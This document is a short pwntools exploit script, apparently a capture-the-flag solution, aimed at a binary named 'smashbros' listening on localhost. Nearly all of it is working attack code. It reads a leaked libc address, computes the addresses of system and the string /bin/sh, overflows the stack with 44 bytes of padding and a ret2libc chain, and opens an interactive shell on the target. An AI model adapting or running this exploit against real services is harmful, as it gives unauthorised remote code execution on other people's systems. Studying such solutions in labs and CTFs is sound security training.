#!/usr/bin/env python
from pwn import *

'''
> objdump -d smashbros | less
080483a0 <puts@plt>:
 80483a0:       ff 25 18 a0 04 08       jmp    *0x804a018
 80483a6:       68 18 00 00 00          push   $0x18
 80483ab:       e9 b0 ff ff ff          jmp    8048360 <.plt>

stdin_got = 0x804a018
'''

stdin_offset = 0x1d85c0
system_offset = 0x3d200
binsh_offset = 0x17e0cf

TIMEOUT = 1
t = remote('localhost', 18000)

output = t.clean(TIMEOUT)
x = output.find('stdin: ')+7
stdin_real = int(output[x:x+10],0)
log.info('Leaked stdin address : 0x{0:0{1}X}'.format(stdin_real, 8))

libcbase = stdin_real - stdin_offset
log.info('LIBC base address    : 0x{0:0{1}X}'.format(libcbase, 8))

padding = "A" * 44
systemaddr = p32(libcbase+system_offset) # address of system in libc
log.info('System address       : 0x{0:0{1}X}'.format(libcbase+system_offset, 8))

return_after_system = "FAKE" # useless return address
binsh = p32(libcbase+binsh_offset) # address of string /bin/sh in libc
log.info('/bin/sh address      : 0x{0:0{1}X}'.format(libcbase+binsh_offset, 8))

t.send(padding+systemaddr+return_after_system+binsh)

t.clean(TIMEOUT)
t.interactive()